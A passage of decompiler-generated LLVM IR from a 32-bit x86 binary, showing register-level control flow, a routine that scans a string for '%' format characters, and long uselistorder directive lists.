  %v0_804c5e7 = phi i32 [ 0, %dec_label_pc_804c5cf ], [ %v4_804c5df, %dec_label_pc_804c5d5 ]
  %v2_804c5e7 = sub i32 %v0_804c5e7, %v1_804c5e7
  %v12_804c5e7 = icmp eq i32 %v2_804c5e7, 0
  %v13_804c5e7 = icmp slt i32 %v2_804c5e7, 0
  store i1 %v13_804c5e7, i1* %sf.global-to-local, align 1
  %v1_804c5e9 = icmp eq i1 %v12_804c5e7, false
  br i1 %v1_804c5e9, label %dec_label_pc_804c67f, label %dec_label_pc_804c651

dec_label_pc_804c5f1:                             ; preds = %dec_label_pc_804c5c5
  %v1_804c5f1 = add i32 %v0_804c5ba, 348
  %v2_804c5f1 = inttoptr i32 %v1_804c5f1 to i32*
  store i32 0, i32* %v2_804c5f1, align 4
  %v0_804c64d8 = load i32, i32* @esi, align 4
  %v1_804c64d9 = icmp eq i32 %v0_804c64d8, 0
  %v2_804c64d10 = icmp slt i32 %v0_804c64d8, 0
  store i1 %v2_804c64d10, i1* %sf.global-to-local, align 1
  %v1_804c64f16 = icmp eq i1 %v1_804c64d9, false
  %v0_804c5fe.pre = load i32, i32* @esp, align 4
  br i1 %v1_804c64f16, label %dec_label_pc_804c5fe, label %dec_label_pc_804c651

dec_label_pc_804c5fe:                             ; preds = %dec_label_pc_804c5f1, %dec_label_pc_804c64b
  %v0_804c605 = phi i32 [ %v2_804c64b, %dec_label_pc_804c64b ], [ %v0_804c64d8, %dec_label_pc_804c5f1 ]
  %v1_804c610 = phi i32 [ %v0_804c5fe41, %dec_label_pc_804c64b ], [ %v0_804c5fe.pre, %dec_label_pc_804c5f1 ]
  %v1_804c5fe = add i32 %v1_804c610, 332
  store i32 %v1_804c5fe, i32* %edx.global-to-local, align 4
  %v1_804c605 = add i32 %v0_804c605, -128
  %v2_804c605 = icmp ult i32 %v0_804c605, 128
  %v6_804c605 = icmp eq i32 %v1_804c605, 0
  %v7_804c605 = icmp slt i32 %v1_804c605, 0
  store i1 %v7_804c605, i1* %sf.global-to-local, align 1
  store i32 128, i32* %eax.global-to-local, align 4
  %v2_804c610 = add i32 %v1_804c610, -4
  %v3_804c610 = inttoptr i32 %v2_804c610 to i32*
  store i32 %v1_804c5fe, i32* %v3_804c610, align 4
  %v2_804c611 = or i1 %v2_804c605, %v6_804c605
  %v3_804c611 = load i32, i32* %eax.global-to-local, align 4
  %v4_804c611 = load i32, i32* @esi, align 4
  %v5_804c611 = select i1 %v2_804c611, i32 %v4_804c611, i32 %v3_804c611
  %v2_804c614 = add i32 %v1_804c610, -8
  %v3_804c614 = inttoptr i32 %v2_804c614 to i32*
  store i32 %v5_804c611, i32* %v3_804c614, align 4
  %v1_804c615 = add i32 %v1_804c610, 340
  store i32 %v1_804c615, i32* %eax.global-to-local, align 4
  %v2_804c61c = add i32 %v1_804c610, -12
  %v3_804c61c = inttoptr i32 %v2_804c61c to i32*
  store i32 %v1_804c615, i32* %v3_804c61c, align 4
  %v1_804c61d = add i32 %v1_804c610, 204
  store i32 %v1_804c61d, i32* @edi, align 4
  %v2_804c624 = add i32 %v1_804c610, -16
  %v3_804c624 = inttoptr i32 %v2_804c624 to i32*
  store i32 %v1_804c61d, i32* %v3_804c624, align 4
  %v0_804c625 = call i32 @function_804f878()
  %v0_804c62a = load i32, i32* @esp, align 4
  %v1_804c62a = add i32 %v0_804c62a, 16
  store i32 %v0_804c625, i32* @ebx, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_804c631 = icmp eq i32 %v0_804c625, 0
  %v2_804c631 = icmp slt i32 %v0_804c625, 0
  store i1 %v2_804c631, i1* %sf.global-to-local, align 1
  br i1 %v1_804c631, label %dec_label_pc_804c647, label %dec_label_pc_804c635

dec_label_pc_804c635:                             ; preds = %dec_label_pc_804c5fe
  %v0_804c635 = load i32, i32* @ebp, align 4
  %v2_804c635 = add i32 %v0_804c62a, 12
  %v3_804c635 = inttoptr i32 %v2_804c635 to i32*
  store i32 %v0_804c635, i32* %v3_804c635, align 4
  %v1_804c636 = add i32 %v0_804c62a, 384
  %v2_804c636 = inttoptr i32 %v1_804c636 to i32*
  %v3_804c636 = load i32, i32* %v2_804c636, align 4
  %v5_804c636 = add i32 %v0_804c62a, 8
  %v6_804c636 = inttoptr i32 %v5_804c636 to i32*
  store i32 %v3_804c636, i32* %v6_804c636, align 4
  %v2_804c63d = add i32 %v0_804c62a, 4
  %v3_804c63d = inttoptr i32 %v2_804c63d to i32*
  store i32 %v0_804c625, i32* %v3_804c63d, align 4
  %v0_804c63e = load i32, i32* @edi, align 4
  %v3_804c63e = inttoptr i32 %v0_804c62a to i32*
  store i32 %v0_804c63e, i32* %v3_804c63e, align 4
  %v0_804c63f = load i32, i32* %stack_var_-364, align 4
  %v4_804c63f = call i32 @function_804f9d4(i32 %v0_804c63f, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804c63f, i32* %eax.global-to-local, align 4
  %v0_804c644 = load i32, i32* @esp, align 4
  %v1_804c644 = add i32 %v0_804c644, 16
  %v7_804c644 = icmp slt i32 %v1_804c644, 0
  store i1 %v7_804c644, i1* %sf.global-to-local, align 1
  br label %dec_label_pc_804c647

dec_label_pc_804c647:                             ; preds = %dec_label_pc_804c5fe, %dec_label_pc_804c635
  %v1_804c64b = phi i32 [ 0, %dec_label_pc_804c5fe ], [ %v4_804c63f, %dec_label_pc_804c635 ]
  %v0_804c5fe41 = phi i32 [ %v1_804c62a, %dec_label_pc_804c5fe ], [ %v1_804c644, %dec_label_pc_804c635 ]
  %v2_804c647 = sub i32 %v1_804c64b, %v0_804c625
  %v12_804c647 = icmp eq i32 %v2_804c647, 0
  %v13_804c647 = icmp slt i32 %v2_804c647, 0
  store i1 %v13_804c647, i1* %sf.global-to-local, align 1
  %v1_804c649 = icmp eq i1 %v12_804c647, false
  br i1 %v1_804c649, label %dec_label_pc_804c67f, label %dec_label_pc_804c64b

dec_label_pc_804c64b:                             ; preds = %dec_label_pc_804c647
  %v0_804c64b = load i32, i32* @esi, align 4
  %v2_804c64b = sub i32 %v0_804c64b, %v1_804c64b
  %v12_804c64b = icmp eq i32 %v2_804c64b, 0
  %v13_804c64b = icmp slt i32 %v2_804c64b, 0
  store i32 %v2_804c64b, i32* @esi, align 4
  store i1 %v13_804c64b, i1* %sf.global-to-local, align 1
  %v1_804c64f = icmp eq i1 %v12_804c64b, false
  br i1 %v1_804c64f, label %dec_label_pc_804c5fe, label %dec_label_pc_804c651

dec_label_pc_804c651:                             ; preds = %dec_label_pc_804c64b, %dec_label_pc_804c5f1, %dec_label_pc_804c5e7
  %v0_804c651 = phi i32 [ %v0_804c65146, %dec_label_pc_804c5e7 ], [ %v0_804c5fe.pre, %dec_label_pc_804c5f1 ], [ %v0_804c5fe41, %dec_label_pc_804c64b ]
  %v1_804c651 = add i32 %v0_804c651, 8
  %v2_804c651 = inttoptr i32 %v1_804c651 to i32*
  %v3_804c651 = load i32, i32* %v2_804c651, align 4
  store i32 %v3_804c651, i32* @ecx, align 4
  store i32 32, i32* @edx, align 4
  %v1_804c65a = add i32 %v0_804c651, 368
  %v2_804c65a = inttoptr i32 %v1_804c65a to i32*
  %v3_804c65a = load i32, i32* %v2_804c65a, align 4
  store i32 %v3_804c65a, i32* @eax, align 4
  %v0_804c661 = call i32 @function_804c03c()
  store i32 %v0_804c661, i32* %eax.global-to-local, align 4
  %v1_804c666 = load i32, i32* @esp, align 4
  %v2_804c666 = add i32 %v1_804c666, 8
  %v3_804c666 = inttoptr i32 %v2_804c666 to i32*
  %v4_804c666 = load i32, i32* %v3_804c666, align 4
  %v5_804c666 = sub i32 %v0_804c661, %v4_804c666
  %v15_804c666 = icmp eq i32 %v5_804c666, 0
  %v16_804c666 = icmp slt i32 %v5_804c666, 0
  store i1 %v16_804c666, i1* %sf.global-to-local, align 1
  %v1_804c66a = icmp eq i1 %v15_804c666, false
  br i1 %v1_804c66a, label %dec_label_pc_804c67f, label %dec_label_pc_804c66c

dec_label_pc_804c66c:                             ; preds = %dec_label_pc_804c651, %dec_label_pc_804c204, %dec_label_pc_804c3d9
  %v0_804c66c = phi i32 [ %v1_804c666, %dec_label_pc_804c651 ], [ %v1_804c222, %dec_label_pc_804c204 ], [ %v0_804c66c.pre, %dec_label_pc_804c3d9 ]
  %v1_804c66c = add i32 %v0_804c66c, 16
  %v2_804c66c = inttoptr i32 %v1_804c66c to i32*
  %v3_804c66c = load i32, i32* %v2_804c66c, align 4
  store i32 %v3_804c66c, i32* @ebx, align 4
  store i32 %v3_804c66c, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804c15c.backedge

dec_label_pc_804c677:                             ; preds = %dec_label_pc_804c19a
  %v1_804c677 = add i32 %v0_804c677, 2
  %v10_804c677 = icmp slt i32 %v1_804c677, 0
  store i1 %v10_804c677, i1* %sf.global-to-local, align 1
  store i32 %v1_804c677, i32* @ebx, align 4
  br label %dec_label_pc_804c15c.backedge

dec_label_pc_804c67f:                             ; preds = %dec_label_pc_804c186, %dec_label_pc_804c651, %dec_label_pc_804c5e7, %dec_label_pc_804c592, %dec_label_pc_804c56b, %dec_label_pc_804c4db, %dec_label_pc_804c44e, %dec_label_pc_804c40f, %dec_label_pc_804c3b0, %dec_label_pc_804c647
  %v0_804c67f = phi i32 [ %v0_804c5fe41, %dec_label_pc_804c647 ], [ %v0_804c67f.pre.pre, %dec_label_pc_804c186 ], [ %v1_804c666, %dec_label_pc_804c651 ], [ %v0_804c65146, %dec_label_pc_804c5e7 ], [ %v1_804c5ba, %dec_label_pc_804c592 ], [ %v1_804c580, %dec_label_pc_804c56b ], [ %v0_804c1fc.lcssa, %dec_label_pc_804c4db ], [ %v1_804c466, %dec_label_pc_804c44e ], [ %v1_804c432, %dec_label_pc_804c40f ], [ %v1_804c3ce, %dec_label_pc_804c3b0 ]
  %v1_804c67f = inttoptr i32 %v0_804c67f to i32*
  store i32 -1, i32* %v1_804c67f, align 4
  br label %dec_label_pc_804c686

dec_label_pc_804c686:                             ; preds = %dec_label_pc_804c191, %dec_label_pc_804c0ff, %dec_label_pc_804c11e, %dec_label_pc_804c67f
  %v0_804c686 = load i32, i32* @esp, align 4
  %v1_804c686 = inttoptr i32 %v0_804c686 to i32*
  %v2_804c686 = load i32, i32* %v1_804c686, align 4
  store i32 %v2_804c686, i32* %eax.global-to-local, align 4
  %v1_804c689 = add i32 %v0_804c686, 348
  %v10_804c689 = icmp slt i32 %v1_804c689, 0
  store i1 %v10_804c689, i1* %sf.global-to-local, align 1
  ret i32 %v2_804c686

; uselistorder directives
  uselistorder i32 %v1_804c677, { 1, 2, 0 }
  uselistorder i32 %v3_804c66c, { 2, 3, 0, 1 }
  uselistorder i32 %v0_804c651, { 1, 0 }
  uselistorder i32 %v2_804c64b, { 1, 2, 3, 0 }
  uselistorder i32 %v0_804c62a, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_804c625, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v1_804c605, { 1, 0 }
  uselistorder i32 %v0_804c5fe.pre, { 1, 0 }
  uselistorder i32 %v0_804c5d1, { 1, 0 }
  uselistorder i32 %v3_804c5c5, { 1, 0 }
  uselistorder i32 %v0_804c5ba, { 0, 6, 1, 2, 3, 4, 5, 7 }
  uselistorder i32 %v1_804c592, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_804c56b, { 0, 2, 1, 3 }
  uselistorder i8 %v4_804c553, { 1, 0 }
  uselistorder i32 %v2_804c53f, { 1, 0, 2, 3 }
  uselistorder i32 %v6_804c52c, { 1, 0 }
  uselistorder i32 %v1_804c529, { 1, 0 }
  uselistorder i32 %v1_804c51f, { 1, 0 }
  uselistorder i32 %v0_804c51f, { 0, 2, 1, 3 }
  uselistorder i32 %v1_804c4fe, { 1, 0 }
  uselistorder i32 %v1_804c4db, { 1, 0 }
  uselistorder i32 %v1_804c499, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v2_804c4b5, { 3, 2, 1, 0 }
  uselistorder i32 %v1_804c47e, { 1, 0 }
  uselistorder i32 %v1_804c469, { 1, 0 }
  uselistorder i32 %v1_804c435, { 1, 0 }
  uselistorder i32 %v0_804c40f, { 4, 3, 2, 1, 0, 5, 6 }
  uselistorder i32 %v0_804c3f5, { 5, 4, 3, 2, 1, 0, 6, 7 }
  uselistorder i32 %v1_804c3e1, { 1, 0 }
  uselistorder i32 %v1_804c397, { 1, 0 }
  uselistorder i32 %v4_804c365, { 1, 0 }
  uselistorder i32 %v0_804c35a, { 1, 0, 2, 3 }
  uselistorder i8 %v3_804c355, { 1, 0 }
  uselistorder i32 %v0_804c38e, { 1, 0, 2, 3 }
  uselistorder i8 %v3_804c345, { 1, 0 }
  uselistorder i32 %v1_804c33c, { 1, 0 }
  uselistorder i32 %v1_804c330, { 1, 0 }
  uselistorder i32 %v3_804c324, { 1, 2, 0, 3 }
  uselistorder i32 %v3_804c31a, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %v1_804c315, { 0, 1, 3, 2, 5, 4, 6 }
  uselistorder i32 %v2_804c313, { 1, 0 }
  uselistorder i32 %v0_804c365, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v0_804c355, { 1, 2, 0 }
  uselistorder i32 %v3_804c2ed, { 0, 1, 3, 2 }
  uselistorder i8 %v4_804c2db, { 1, 0 }
  uselistorder i32 %v4_804c2d2, { 1, 0 }
  uselistorder i32 %v3_804c2d2, { 1, 0 }
  uselistorder i32 %v6_804c2ca, { 0, 1, 2, 5, 3, 4 }
  uselistorder i32 %v0_804c29b, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32 %v1_804c29a, { 2, 1, 0 }
  uselistorder i32 %v1_804c273, { 1, 0 }
  uselistorder i32 %v1_804c267, { 1, 0 }
  uselistorder i32 %v1_804c262, { 1, 0 }
  uselistorder i32 %v2_804c25a, { 1, 0 }
  uselistorder i32 %tmp67, { 1, 0 }
  uselistorder i32 %v3_804c244, { 1, 0, 2 }
  uselistorder i8 %v3_804c233, { 1, 2, 0, 3 }
  uselistorder i32 %v1_804c22a, { 1, 0 }
  uselistorder i32 %v3_804c1fc, { 11, 5, 16, 9, 10, 0, 1, 8, 7, 15, 4, 14, 12, 13, 6, 2, 3, 17, 18, 19 }
  uselistorder i32 %v0_804c1fc.lcssa, { 0, 8, 9, 7, 6, 10, 26, 25, 13, 14, 15, 16, 17, 18, 12, 11, 21, 20, 19, 24, 23, 22, 2, 3, 4, 5, 1 }
  uselistorder i32 %v2_804c1f8, { 1, 0 }
  uselistorder i32 %v1_804c1f8.pre, { 1, 0 }
  uselistorder i32 %v1_804c1f7, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_804c1f4, { 1, 0 }
  uselistorder i32 %v2_804c1f871, { 1, 0 }
  uselistorder i32 %v3_804c1de, { 1, 0 }
  uselistorder i8 %v4_804c19a, { 1, 0 }
  uselistorder i32 %v1_804c19a, { 1, 0, 3, 2 }
  uselistorder i8 %v2_804c191, { 1, 0 }
  uselistorder i32 %v2_804c166, { 0, 2, 1, 3, 4 }
  uselistorder i8 %v2_804c162, { 1, 0 }
  uselistorder i8 %v2_804c15c, { 0, 2, 1, 3 }
  uselistorder i32 %v0_804c16a, { 0, 1, 3, 2 }
  uselistorder i32 %v0_804c14c, { 1, 0, 2 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-348, { 1, 0, 2 }
  uselistorder i32* %stack_var_-364, { 3, 1, 5, 0, 4, 6, 2, 7, 8, 9, 10 }
  uselistorder i1* %sf.global-to-local, { 1, 2, 3, 8, 4, 5, 6, 7, 0, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 54, 55, 53, 56, 57, 58, 59, 60, 61 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 13, 18, 19, 22, 20, 21, 23, 24, 25, 4, 3, 5, 6, 11, 7, 8, 9, 12, 10, 14, 15, 16, 17 }
  uselistorder i32* %ecx.global-to-local, { 0, 1, 6, 7, 8, 9, 10, 11, 2, 3, 4, 5 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 15, 13, 16, 17, 18, 19, 20, 21, 22, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 57, 58, 59, 60, 61, 62, 63, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 37, 36, 0, 33, 34, 35, 38, 39, 40, 56, 41, 42, 43, 44 }
  uselistorder i32 348, { 1, 0 }
  uselistorder i32 ()* @function_804c03c, { 2, 1, 0, 3 }
  uselistorder i32 ()* @function_804f878, { 1, 0 }
  uselistorder i32 332, { 1, 0, 2, 3 }
  uselistorder i32 204, { 1, 2, 4, 5, 3, 0 }
  uselistorder i32 344, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 368, { 3, 1, 4, 0, 2 }
  uselistorder label %dec_label_pc_804c686, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_804c67f, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_804c66c, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804c647, { 1, 0 }
  uselistorder label %dec_label_pc_804c5fe, { 1, 0 }
  uselistorder label %dec_label_pc_804c5e7, { 1, 0 }
  uselistorder label %dec_label_pc_804c592, { 1, 0 }
  uselistorder label %dec_label_pc_804c564, { 1, 0 }
  uselistorder label %dec_label_pc_804c549, { 1, 0 }
  uselistorder label %dec_label_pc_804c533, { 1, 0 }
  uselistorder label %dec_label_pc_804c51f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804c51a, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804c4ac, { 1, 0 }
  uselistorder label %dec_label_pc_804c492, { 1, 0 }
  uselistorder label %dec_label_pc_804c3b0, { 1, 0 }
  uselistorder label %dec_label_pc_804c355, { 5, 1, 0, 2, 4, 3 }
  uselistorder label %dec_label_pc_804c303, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_804c2b3, { 1, 0 }
  uselistorder label %dec_label_pc_804c29a, { 1, 0 }
  uselistorder label %dec_label_pc_804c286, { 1, 0 }
  uselistorder label %dec_label_pc_804c281, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804c262, { 1, 0 }
  uselistorder label %dec_label_pc_804c1ed, { 1, 0 }
  uselistorder label %dec_label_pc_804c1e5, { 1, 0 }
  uselistorder label %dec_label_pc_804c191, { 1, 0 }
  uselistorder label %dec_label_pc_804c186, { 1, 0 }
  uselistorder label %dec_label_pc_804c15c.backedge, { 2, 1, 0 }
}

define i32 @function_804c694(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804c694:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804c694 = load i32, i32* @esi, align 4
  %v0_804c695 = load i32, i32* @ebx, align 4
  store i32 %v0_804c695, i32* %stack_var_-8, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg2, i32* @esi, align 4
  %v3_804c6a9 = bitcast i32* %arg1 to i8*
  %v4_804c6a9 = call i32 @function_804d1d0(i8* %v3_804c6a9, i32 0, i32 188)
  %v0_804c6ae = load i32, i32* @ebx, align 4
  %v1_804c6ae = add i32 %v0_804c6ae, 40
  store i32 %v1_804c6ae, i32* %eax.global-to-local, align 4
  store i32 9, i32* %edx.global-to-local, align 4
  %v1_804c6b6 = add i32 %v0_804c6ae, 24
  %v2_804c6b6 = inttoptr i32 %v1_804c6b6 to i32*
  %v3_804c6b6 = load i32, i32* %v2_804c6b6, align 4
  %v4_804c6b6 = add i32 %v3_804c6b6, -1
  store i32 %v4_804c6b6, i32* %v2_804c6b6, align 4
  %v0_804c6bc = load i32, i32* @esi, align 4
  %v1_804c6bc = load i32, i32* @ebx, align 4
  %v2_804c6bc = inttoptr i32 %v1_804c6bc to i32*
  store i32 %v0_804c6bc, i32* %v2_804c6bc, align 4
  %v0_804c6be.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c6be

dec_label_pc_804c6be:                             ; preds = %dec_label_pc_804c6be, %dec_label_pc_804c694
  %v0_804c6be = phi i32 [ %v1_804c6c4, %dec_label_pc_804c6be ], [ %v0_804c6be.pre, %dec_label_pc_804c694 ]
  %v1_804c6be = inttoptr i32 %v0_804c6be to i32*
  store i32 8, i32* %v1_804c6be, align 4
  %v0_804c6c4 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c6c4 = add i32 %v0_804c6c4, 4
  store i32 %v1_804c6c4, i32* %eax.global-to-local, align 4
  %v0_804c6c7 = load i32, i32* %edx.global-to-local, align 4
  %v1_804c6c7 = add i32 %v0_804c6c7, -1
  %v8_804c6c7 = icmp eq i32 %v1_804c6c7, 0
  store i32 %v1_804c6c7, i32* %edx.global-to-local, align 4
  %v1_804c6c8 = icmp eq i1 %v8_804c6c7, false
  br i1 %v1_804c6c8, label %dec_label_pc_804c6be, label %dec_label_pc_804c6ca

dec_label_pc_804c6ca:                             ; preds = %dec_label_pc_804c6be
  %v0_804c6ca = load i32, i32* @esi, align 4
  store i32 %v0_804c6ca, i32* %eax.global-to-local, align 4
  %v1_804c6f520 = inttoptr i32 %v0_804c6ca to i8*
  %v2_804c6f521 = load i8, i8* %v1_804c6f520, align 1
  %v3_804c6f522 = zext i8 %v2_804c6f521 to i32
  %v5_804c6f523 = and i32 %v1_804c6c7, -256
  %v6_804c6f524 = or i32 %v3_804c6f522, %v5_804c6f523
  store i32 %v6_804c6f524, i32* %edx.global-to-local, align 4
  %v4_804c6f725 = icmp eq i8 %v2_804c6f521, 0
  %v1_804c6f927 = icmp eq i1 %v4_804c6f725, false
  br i1 %v1_804c6f927, label %dec_label_pc_804c6d3, label %dec_label_pc_804c6fb

dec_label_pc_804c6d3:                             ; preds = %dec_label_pc_804c6ca, %dec_label_pc_804c6f5.backedge
  %v6_804c6f530 = phi i32 [ %v6_804c6f5, %dec_label_pc_804c6f5.backedge ], [ %v6_804c6f524, %dec_label_pc_804c6ca ]
  %v2_804c6f529 = phi i8 [ %v2_804c6f5, %dec_label_pc_804c6f5.backedge ], [ %v2_804c6f521, %dec_label_pc_804c6ca ]
  %v0_804c6d828 = phi i32 [ %v0_804c6d8.be, %dec_label_pc_804c6f5.backedge ], [ %v0_804c6ca, %dec_label_pc_804c6ca ]
  %v10_804c6d3 = icmp eq i8 %v2_804c6f529, 37
  %v1_804c6d6 = icmp eq i1 %v10_804c6d3, false
  br i1 %v1_804c6d6, label %dec_label_pc_804c6f4, label %dec_label_pc_804c6d8

dec_label_pc_804c6d8:                             ; preds = %dec_label_pc_804c6d3
  %v1_804c6d8 = add i32 %v0_804c6d828, 1
  store i32 %v1_804c6d8, i32* %eax.global-to-local, align 4
  %v1_804c6d9 = inttoptr i32 %v1_804c6d8 to i8*
  %v2_804c6d9 = load i8, i8* %v1_804c6d9, align 1
  %v11_804c6d9 = icmp eq i8 %v2_804c6d9, 37
  br i1 %v11_804c6d9, label %dec_label_pc_804c6f4, label %dec_label_pc_804c6de

dec_label_pc_804c6de:                             ; preds = %dec_label_pc_804c6d8
  %v1_804c6e1 = load i32, i32* @ebx, align 4
  %v2_804c6e1 = inttoptr i32 %v1_804c6e1 to i32*
  store i32 %v1_804c6d8, i32* %v2_804c6e1, align 4
  %v0_804c6e3 = load i32, i32* @ebx, align 4
  %v1_804c6e4 = inttoptr i32 %v0_804c6e3 to i32*
  %v2_804c6e4 = call i32 @function_804c885(i32* %v1_804c6e4)
  store i32 %v2_804c6e4, i32* %eax.global-to-local, align 4
  %v2_804c6ec = icmp slt i32 %v2_804c6e4, 0
  br i1 %v2_804c6ec, label %dec_label_pc_804c6ff, label %dec_label_pc_804c6f0

dec_label_pc_804c6f0:                             ; preds = %dec_label_pc_804c6de
  %v0_804c6f0 = load i32, i32* @ebx, align 4
  %v1_804c6f0 = inttoptr i32 %v0_804c6f0 to i32*
  %v2_804c6f0 = load i32, i32* %v1_804c6f0, align 4
  %v4_804c6f5.pre.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804c6f5.backedge

dec_label_pc_804c6f4:                             ; preds = %dec_label_pc_804c6d8, %dec_label_pc_804c6d3
  %v0_804c6f4 = phi i32 [ %v1_804c6d8, %dec_label_pc_804c6d8 ], [ %v0_804c6d828, %dec_label_pc_804c6d3 ]
  %v1_804c6f4 = add i32 %v0_804c6f4, 1
  br label %dec_label_pc_804c6f5.backedge

dec_label_pc_804c6f5.backedge:                    ; preds = %dec_label_pc_804c6f4, %dec_label_pc_804c6f0
  %v4_804c6f5.be = phi i32 [ %v4_804c6f5.pre.pre, %dec_label_pc_804c6f0 ], [ %v6_804c6f530, %dec_label_pc_804c6f4 ]
  %v0_804c6d8.be = phi i32 [ %v2_804c6f0, %dec_label_pc_804c6f0 ], [ %v1_804c6f4, %dec_label_pc_804c6f4 ]
  store i32 %v0_804c6d8.be, i32* %eax.global-to-local, align 4
  %v1_804c6f5 = inttoptr i32 %v0_804c6d8.be to i8*
  %v2_804c6f5 = load i8, i8* %v1_804c6f5, align 1
  %v3_804c6f5 = zext i8 %v2_804c6f5 to i32
  %v5_804c6f5 = and i32 %v4_804c6f5.be, -256
  %v6_804c6f5 = or i32 %v3_804c6f5, %v5_804c6f5
  store i32 %v6_804c6f5, i32* %edx.global-to-local, align 4
  %v4_804c6f7 = icmp eq i8 %v2_804c6f5, 0
  %v1_804c6f9 = icmp eq i1 %v4_804c6f7, false
  br i1 %v1_804c6f9, label %dec_label_pc_804c6d3, label %dec_label_pc_804c6f5.dec_label_pc_804c6fb_crit_edge

dec_label_pc_804c6f5.dec_label_pc_804c6fb_crit_edge: ; preds = %dec_label_pc_804c6f5.backedge
  %v0_804c6fb.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804c6fb

dec_label_pc_804c6fb:                             ; preds = %dec_label_pc_804c6f5.dec_label_pc_804c6fb_crit_edge, %dec_label_pc_804c6ca
  %v0_804c6fb = phi i32 [ %v0_804c6fb.pre, %dec_label_pc_804c6f5.dec_label_pc_804c6fb_crit_edge ], [ %v0_804c6ca, %dec_label_pc_804c6ca ]
  %v1_804c6fb = load i32, i32* @ebx, align 4
  %v2_804c6fb = inttoptr i32 %v1_804c6fb to i32*
  store i32 %v0_804c6fb, i32* %v2_804c6fb, align 4
  br label %dec_label_pc_804c6ff

dec_label_pc_804c6ff:                             ; preds = %dec_label_pc_804c6de, %dec_label_pc_804c6fb
  %storemerge = phi i32 [ 0, %dec_label_pc_804c6fb ], [ -1, %dec_label_pc_804c6de ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v2_804c6ff = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804c6ff, i32* @edx, align 4
  %v2_804c700 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804c700, i32* @ebx, align 4
  store i32 %v0_804c694, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v6_804c6f5, { 1, 0 }
  uselistorder i8 %v2_804c6f5, { 1, 2, 0 }
  uselistorder i32 %v0_804c6d8.be, { 2, 1, 0 }
  uselistorder i32 %v0_804c6d828, { 1, 0 }
  uselistorder i32 %v0_804c6ca, { 1, 0, 2, 3 }
  uselistorder i32 %v1_804c6c7, { 0, 2, 1 }
  uselistorder i32 %v1_804c6c4, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 2, 1, 3, 4, 0, 5, 7, 6, 8 }
  uselistorder label %dec_label_pc_804c6ff, { 1, 0 }
  uselistorder label %dec_label_pc_804c6d3, { 1, 0 }
}

define i32 @function_804c704(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804c704:
  %stack_var_-12 = alloca i32, align 4
  %v0_804c704 = load i32, i32* @esi, align 4
  %v0_804c705 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804c711 = add i32 %arg1, 24
  %v2_804c711 = inttoptr i32 %v1_804c711 to i32*
  %v3_804c711 = load i32, i32* %v2_804c711, align 4
  %v2_804c714 = add i32 %arg1, 76
  %v3_804c714 = inttoptr i32 %v2_804c714 to i32*
  store i32 %arg2, i32* %v3_804c714, align 4
  %tmp8 = icmp slt i32 %v3_804c711, 1
  br i1 %tmp8, label %dec_label_pc_804c742, label %dec_label_pc_804c71b

dec_label_pc_804c71b:                             ; preds = %dec_label_pc_804c704
  %v1_804c71e = load i32, i32* @ebx, align 4
  %v2_804c71e = add i32 %v1_804c71e, 28
  %v3_804c71e = inttoptr i32 %v2_804c71e to i32*
  store i32 %v3_804c711, i32* %v3_804c71e, align 4
  %v0_804c721 = load i32, i32* @ebx, align 4
  %v1_804c721 = add i32 %v0_804c721, 24
  %v2_804c721 = inttoptr i32 %v1_804c721 to i32*
  store i32 0, i32* %v2_804c721, align 4
  %v0_804c728 = load i32, i32* @ebx, align 4
  %v1_804c728 = add i32 %v0_804c728, 4
  %v2_804c728 = inttoptr i32 %v1_804c728 to i32*
